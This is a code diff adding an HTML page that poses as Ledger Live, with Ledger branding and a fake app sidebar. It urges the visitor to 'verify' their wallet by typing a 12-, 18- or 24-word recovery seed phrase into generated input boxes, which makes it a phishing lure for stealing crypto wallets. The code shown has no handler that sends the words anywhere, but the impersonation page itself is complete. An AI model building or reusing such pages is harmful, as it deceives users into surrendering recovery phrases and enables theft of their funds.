@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Verify Seed Phrase - Ledger Live</title>
+  <style>
+    body {
+      background-color: #111;
+      color: #fff;
+      font-family: 'Courier New', monospace;
+      margin: 0;
+      padding: 0;
+    }
+
+    .sidebar {
+      background-color: #181818;
+      width: 250px;
+      height: 100vh;
+      padding-top: 40px;
+      position: fixed;
+      left: 0;
+      top: 0;
+    }
+
+    .sidebar h2 {
+      text-align: center;
+      color: #fff;
+      margin-bottom: 40px;
+    }
+
+    .sidebar ul {
+      list-style: none;
+      padding: 0;
+    }
+
+    .sidebar ul li {
+      padding: 15px 25px;
+      font-size: 15px;
+      color: #ccc;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+
+    .sidebar ul li:hover {
+      color: #fff;
+      background-color: #222;
+    }
+
+    .main {
+      margin-left: 270px;
+      padding: 40px;
+    }
+
+    h1 {
+      font-size: 26px;
+      letter-spacing: 1px;
+    }
+
+    .tabs {
+      display: flex;
+      gap: 15px;
+      margin-top: 20px;
+      margin-bottom: 30px;
+    }
+
+    .tabs button {
+      background-color: #222;
+      color: #fff;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 8px;
+      cursor: pointer;
+      font-weight: bold;
+      transition: background 0.3s ease;
+    }
+
+    .tabs button.active {
+      background-color: #9b9bff;
+      color: #000;
+    }
+
+    .tabs button:hover {
+      background-color: #444;
+    }
+
+    .phrase-container {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 15px;
+      max-width: 800px;
+    }
+
+    .phrase-input {
+      background-color: #222;
+      border: none;
+      color: #fff;
+      padding: 10px;
+      border-radius: 5px;
+      font-size: 14px;
+    }
+
+    .continue-btn {
+      margin-top: 40px;
+      padding: 12px 35px;
+      border: none;
+      border-radius: 25px;
+      background-color: #fff;
+      color: #000;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+
+    .continue-btn:hover {
+      background-color: #9b9bff;
+    }
+
+    p {
+      color: #bbb;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="sidebar">
+    <h2>[ LEDGER-LIVE ]</h2>
+    <ul>
+      <li>📂 Portfolio</li>
+      <li>💱 Market</li>
+      <li>👤 Accounts</li>
+      <li>📤 Send</li>
+      <li>📥 Receive</li>
+      <li>💰 Buy/Sell</li>
+      <li>🔄 Swap</li>
+      <li>🧰 Manager</li>
+    </ul>
+  </div>
+
+  <div class="main">
+    <h1>VERIFY SEED PHRASE OF YOUR DEVICE</h1>
+    <p>Enter your Recovery Seed Phrase Words to Import & Download Your Wallet App.<br>
+    **Ledger does not keep a copy of your recovery phrase.<br>
+    **ENTER SEED PHRASE WORDS CORRECTLY TO START LEDGER LIVE.</p>
+
+    <div class="tabs">
+      <button id="btn12" class="active" onclick="generateInputs(12, this)">12 Words</button>
+      <button id="btn18" onclick="generateInputs(18, this)">18 Words</button>
+      <button id="btn24" onclick="generateInputs(24, this)">24 Words</button>
+    </div>
+
+    <div id="phraseContainer" class="phrase-container"></div>
+
+    <button class="continue-btn">Continue...</button>
+  </div>
+
+  <script>
+    function generateInputs(count, btn) {
+      document.querySelectorAll('.tabs button').forEach(b => b.classList.remove('active'));
+      btn.classList.add('active');
+      const container = document.getElementById('phraseContainer');
+      container.innerHTML = '';
+      for (let i = 1; i <= count; i++) {
+        const input = document.createElement('input');
+        input.type = 'text';
+        input.placeholder = i;
+        input.className = 'phrase-input';
+        container.appendChild(input);
+      }
+    }
+
+    // Default: 12 words visible
+    window.onload = () => generateInputs(12, document.getElementById('btn12'));
+  </script>
+
+</body>
+</html>
